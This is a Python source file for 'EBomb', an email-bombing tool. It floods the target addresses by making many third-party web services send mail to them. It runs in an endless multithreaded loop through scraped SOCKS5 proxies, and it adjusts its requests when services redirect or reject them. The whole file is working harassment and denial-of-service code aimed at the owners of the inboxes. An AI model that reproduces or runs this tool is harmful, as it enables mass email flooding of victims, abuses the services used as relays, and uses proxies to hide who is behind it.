from __future__ import annotations

import json
import multiprocessing
import reprlib
import shutil
from multiprocessing.pool import ThreadPool

import spys.me
from requests.exceptions import RequestException
from rich.console import Console

from EBomb.services import *

__all__ = ('EBomb', 'Service', 'services')


class EBomb:
    class _Markup:
        """Contain colors for rich print"""
        __slots__ = ('service', 'method', 'proxy', 'response')

        def __init__(self):
            self.service = self.method = self.proxy = self.response = 'green'

    class _Repr(reprlib.Repr):
        __slots__ = ('maxother',)

        def __init__(self, max_right_align: int):
            super().__init__()
            self.maxother = shutil.get_terminal_size().columns - max_right_align

    def __init__(self, targets: list[str], threads_count: int = None, proxy: bool = True, forever: bool = True,
                 verbose: bool = True):
        self.console = Console()
        self.console.quiet = not verbose

        self.targets = [j for j in [str(i).strip() for i in targets] if j]
        if not targets:
            return

        self.forever = forever
        self._max_netloc_len = max(len(serv.netloc or '') for serv in services)
        self._max_email_len = max(len(e) for e in targets)

        self._repr = self._Repr(70 + self._max_netloc_len + self._max_email_len)

        if proxy:
            self.__proxies = [*spys.me.Getters.get_socks5_proxies()]
            self._working_proxy = sorted(self.__proxies, key=str)[0]
        else:
            self._working_proxy = None
            self.__proxies = []
        self.proxy = proxy

        self.start(threads_count)

    @property
    def working_proxy(self):
        if not (self._working_proxy and self._working_proxy in self.proxies):
            self._working_proxy = sorted(self.proxies, key=str)[0]
        return self._working_proxy

    @property
    def proxies(self):
        if self.proxy and not self.__proxies:
            self.__proxies += spys.me.Getters.get_socks5_proxies()
        return self.__proxies

    def start(self, threads_count: int = None):
        _urls = len(services)
        _n_urls_color = 'green' if _urls else 'red'
        _proxy_color = 'green' if self.proxy else 'red'
        self.console.print(
            "[blue][italic]Starting... [bold red]CTRL+BREAK[/bold red] to exit.[/italic]\n"
            f"URL{'s' if _urls > 1 else ''}: [{_n_urls_color}]{_urls}[/{_n_urls_color}] "
            f"[italic]([{_n_urls_color}]{UNIQUE_NETLOC}[/{_n_urls_color}] service{'s' if UNIQUE_NETLOC > 1 else ''})[/italic]\n"
            f"Proxy: [{_proxy_color}]{self.proxy}[/{_proxy_color}]\n"
            f"Email{'s' if len(self.targets) > 1 else ''}: [yellow]{'; '.join(f'{i}' for i in self.targets)}[/yellow]\n"
            f"{'HOST':^{self._max_netloc_len}} / METH | {'EMAIL':^{self._max_email_len}}"
            f"{' |         PROXY         ' if self.proxy else ''} | RESPONSE[/blue]")
        args = [(service, email) for email in self.targets for service in services]
        if threads_count is None:
            threads_count = 1 if self.proxy else multiprocessing.cpu_count()
        if threads_count < 1:
            threads_count = 1

        def _starter():
            if threads_count == 1:
                for arg in args:
                    self.request(*arg)
                return
            with ThreadPool(threads_count) as pool:
                pool.starmap(self.request, args)

        if self.forever:
            while True:
                _starter()
        else:
            _starter()

    def request(self, service: Service, email: str):
        _proxy = self.working_proxy
        _markup = self._Markup()
        try:
            resp = service.request(email, proxies=_proxy)
            code = resp.status_code
        except RequestException as Error:
            _markup.response = 'italic red'
            resp = self._repr.repr(Error)
            code = None if Error.response is None else Error.response.status_code
        if service in services and code in (301, 308, 403, 404, 405):
            _markup.response = 'yellow'
            pos = services.index(service)
            if code in (301, 308):
                new_loc = resp.headers.get('Location') if resp is not None else None
                if new_loc:
                    _markup.service = 'italic green'
                    services[pos].url = new_loc
                    services[pos].method = 'GET' if code == 301 else 'POST'
                else:
                    _markup.service = 'yellow'
                    services.pop(pos)
            elif code == 403:
                _markup.service = 'italic red'
            elif code == 404:
                _markup.service = 'red'
                services.pop(pos)
            else:
                _markup.method = 'yellow'
                meth = services[pos].method
                if meth.upper() == 'GET':
                    services[pos].method = 'POST'
                else:
                    _markup.method = 'italic red'
                    services.append(Service(service.url, 'GET'))
        elif code in (None, 401, 407):
            _markup.proxy = 'red'
            proxies = self.proxies
            if _proxy in proxies:
                proxies.remove(_proxy)
        self.console.log(
            '[white]'
            f'[{_markup.service}]{service.netloc:^{self._max_netloc_len}}[/{_markup.service}] '
            f'/ [{_markup.method}]{service.method:<4}[/{_markup.method}] '
            f'| [blue]{email:^{self._max_email_len}}[/blue]'
            f'{f" | [{_markup.proxy}]{str(_proxy):^22}[/{_markup.proxy}]" if _proxy else ""} '
            f'| [{_markup.response}]{resp}[/{_markup.response}]'
            '[/white]'
        )

    def __del__(self):
        with open(JSON_DB_FILE_PATH, 'w', encoding='UTF-8') as update_json:
            json.dump([{'url': serv.url, 'method': serv.method} for serv in services], update_json)
